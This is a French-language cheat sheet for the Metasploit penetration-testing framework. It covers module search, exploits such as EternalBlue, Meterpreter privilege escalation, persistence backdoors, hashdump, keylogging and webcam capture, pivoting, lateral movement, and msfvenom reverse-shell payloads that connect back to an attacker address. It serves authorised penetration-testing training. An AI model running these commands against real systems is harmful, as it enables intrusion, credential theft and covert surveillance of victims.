# Metasploit Framework - Cheat Sheet

## Introduction

**Metasploit** est un framework de test de pénétration open-source développé par Rapid7. Il fournit des informations sur les vulnérabilités de sécurité et aide à valider les tests de pénétration et les évaluations IDS.

---

## Démarrage de Metasploit

### Lancement du framework
```bash
# Démarrer Metasploit Console
msfconsole

# Démarrer avec une base de données
msfdb init
msfconsole

# Lancer en mode silencieux
msfconsole -q

# Charger un script au démarrage
msfconsole -r script.rc
```

### Vérification de l'état
```bash
# Vérifier la connexion à la base de données
db_status

# Reconstruire le cache des modules
reload_all

# Afficher la version
version
```

---

## Navigation et recherche

### Commandes de base
```bash
# Aide générale
help

# Rechercher des modules
search [terme]
search type:exploit platform:windows
search cve:2017-0144

# Afficher les informations d'un module
info [module]

# Utiliser un module
use [module]

# Retourner au contexte principal
back

# Quitter Metasploit
exit
```

### Filtres de recherche
```bash
# Recherche par type
search type:exploit
search type:payload
search type:auxiliary
search type:encoder
search type:nop

# Recherche par plateforme
search platform:windows
search platform:linux
search platform:osx

# Recherche par service
search mysql
search smb
search rdp

# Recherche par CVE
search cve:2019-0708
search cve:2017-0144
```

---

## Configuration des modules

### Gestion des options
```bash
# Afficher les options disponibles
show options

# Afficher les options avancées
show advanced

# Définir une option
set [OPTION] [valeur]
set RHOSTS 192.168.1.100
set RPORT 445

# Annuler une option
unset [OPTION]

# Définir une option globalement
setg [OPTION] [valeur]
setg RHOSTS 192.168.1.0/24

# Afficher les variables globales
show global
```

### Options communes
```bash
# Target (cible)
set RHOSTS 192.168.1.100
set RHOST 192.168.1.100
set RPORT 80

# Payload
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Threads et timing
set THREADS 10
set ConnectTimeout 10
```

---

## Types de modules

### Exploits
```bash
# Lister les exploits
show exploits

# Exploits Windows populaires
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms08_067_netapi
use exploit/windows/dcerpc/ms03_026_dcom

# Exploits Linux populaires
use exploit/linux/samba/is_known_pipename
use exploit/unix/ftp/vsftpd_234_backdoor

# Exploits Web populaires
use exploit/multi/http/struts2_content_type_ognl
use exploit/unix/webapp/drupal_drupalgeddon2
```

### Auxiliary (modules auxiliaires)
```bash
# Scanners
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/http_version
use auxiliary/scanner/ssh/ssh_version

# Fuzzers
use auxiliary/fuzzers/http/http_form_field
use auxiliary/fuzzers/smb/smb_ntlm_negotiate_protocol_fuzzer

# Déni de service
use auxiliary/dos/tcp/synflood
use auxiliary/dos/windows/smb/ms05_047_pnp
```

### Payloads
```bash
# Lister les payloads
show payloads

# Payloads Windows
windows/meterpreter/reverse_tcp
windows/meterpreter/bind_tcp
windows/shell/reverse_tcp
windows/exec

# Payloads Linux
linux/x86/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
linux/x64/shell_reverse_tcp

# Payloads multi-plateformes
multi/meterpreter/reverse_tcp
multi/handler
```

---

## Exploitation

### Exécution des exploits
```bash
# Vérifier la configuration
check

# Lancer l'exploitation
exploit
run

# Lancer en arrière-plan
exploit -j
run -j

# Lancer avec un payload spécifique
exploit -p windows/meterpreter/reverse_tcp
```

### Gestion des sessions
```bash
# Lister les sessions actives
sessions

# Interagir avec une session
sessions -i [ID]
sessions -i 1

# Mettre une session en arrière-plan
background

# Tuer une session
sessions -k [ID]

# Tuer toutes les sessions
sessions -K
```

---

## Meterpreter

### Commandes de base
```bash
# Aide Meterpreter
help

# Informations système
sysinfo
getuid

# Navigation
pwd
ls
cd [répertoire]

# Processus
ps
getpid
migrate [PID]
kill [PID]
```

### Escalade de privilèges
```bash
# Obtenir les privilèges système (Windows)
getsystem

# Lister les privilèges
getprivs

# UAC Bypass
bypass_uac

# Utiliser des exploits locaux
use post/windows/escalate/getsystem
```

### Persistence
```bash
# Créer une backdoor persistante
run persistence -A -L c:\\ -X -i 5 -p 4444 -r 192.168.1.50

# Service persistant
run metsvc

# Scheduled task
run scheduleme

# Registry persistence
run persistence -S -i 5 -p 4444 -r 192.168.1.50
```

### Collecte d'informations
```bash
# Hashdump
hashdump
run post/windows/gather/hashdump

# Informations réseau
arp
netstat
route

# Captures d'écran
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Webcam
webcam_list
webcam_snap
webcam_stream
```

### Pivoting
```bash
# Ajouter une route
route add 10.10.10.0 255.255.255.0 [session_id]

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.10.10.100

# SOCKS proxy
use auxiliary/server/socks4a
use auxiliary/server/socks5
```

---

## Post-exploitation

### Modules Post
```bash
# Énumération Windows
use post/windows/gather/enum_system
use post/windows/gather/enum_shares
use post/windows/gather/enum_applications
use post/windows/gather/credentials/windows_autologin

# Énumération Linux
use post/linux/gather/enum_system
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history

# Collecte de credentials
use post/windows/gather/credentials/credential_collector
use post/multi/gather/firefox_creds
use post/windows/gather/smart_hashdump
```

### Lateral Movement
```bash
# PSExec
use exploit/windows/smb/psexec

# WMI Exec
use exploit/windows/local/wmi_persistence

# Pass the Hash
use exploit/windows/smb/psexec_psh

# Token impersonation
use incognito
list_tokens -u
impersonate_token "DOMAIN\\user"
```

---

## Base de données et workspaces

### Gestion des workspaces
```bash
# Lister les workspaces
workspace

# Créer un workspace
workspace -a [nom]

# Changer de workspace
workspace [nom]

# Supprimer un workspace
workspace -d [nom]
```

### Commandes de base de données
```bash
# Ajouter un host
db_nmap -sS 192.168.1.0/24

# Lister les hosts
hosts

# Lister les services
services

# Lister les vulnérabilités
vulns

# Importer des données
db_import scan.xml

# Exporter des données
db_export -f xml output.xml
```

---

## Automatisation

### Scripts et Resource files
```bash
# Exécuter un script resource
resource script.rc

# Créer un script resource
makerc script.rc

# AutoRunScript
set AutoRunScript post/windows/manage/migrate
```

### Exemple de script resource
```bash
# Contenu d'un fichier .rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## Encodage et évasion

### Encoders
```bash
# Lister les encoders
show encoders

# Encoders populaires
x86/shikata_ga_nai
x64/xor
x86/alpha_mixed
cmd/powershell_base64
```

### Génération de payloads
```bash
# MSFvenom (outil externe à msfconsole)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php
```

---

## Handlers et listeners

### Multi/handler
```bash
# Configurer un handler générique
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Handler pour plusieurs connexions
set ExitOnSession false
exploit -j -z
```

---

## Conseils et bonnes pratiques

### Performance
- Utilisez des threads pour accélérer les scans : `set THREADS 10`
- Utilisez `-j` pour exécuter en arrière-plan
- Migrez vers des processus stables dans Meterpreter

### Sécurité
- Utilisez toujours des environnements de test autorisés
- Documentez toutes vos actions
- Nettoyez après vos tests

### Débogage
- Utilisez `check` avant d'exploiter
- Vérifiez les logs avec `set VERBOSE true`
- Testez la connectivité avec des modules auxiliary

---

## Resources utiles

- **Documentation officielle** : https://docs.metasploit.com/
- **Metasploit Unleashed** : https://www.offensive-security.com/metasploit-unleashed/
- **Rapid7 Blog** : https://blog.rapid7.com/
- **GitHub Metasploit** : https://github.com/rapid7/metasploit-framework

---

*Ce cheat sheet couvre les fonctionnalités principales de Metasploit Framework pour les tests de pénétration éthiques et autorisés uniquement.*
